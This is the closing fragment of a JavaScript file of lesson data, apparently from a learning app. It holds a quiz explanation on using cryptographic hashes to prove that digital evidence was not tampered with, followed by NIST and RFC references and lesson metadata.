      "explanation": "Correct is (a): a cryptographic hash recorded at collection and re-verified later is the standard, mathematical proof that not a single bit changed — the direct rebuttal to a tampering claim. (b) is a personal assurance, which carries no evidentiary weight against a technical challenge. (c) storage reliability says nothing about whether the contents were modified. (d) an antivirus scan detects malware, not alteration — a file can be heavily edited and still be malware-free, so it proves nothing about integrity."
    }
  ],
  "references": [
    "https://csrc.nist.gov/pubs/sp/800/86/final",
    "https://www.rfc-editor.org/rfc/rfc3227",
    "https://csrc.nist.gov/pubs/sp/800/61/r2/final"
  ],
  "xp": 180,
  "estimatedMinutes": 34,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
}
];

export default NEW_TOPIC_LESSONS;
export { NEW_TOPIC_LESSONS };
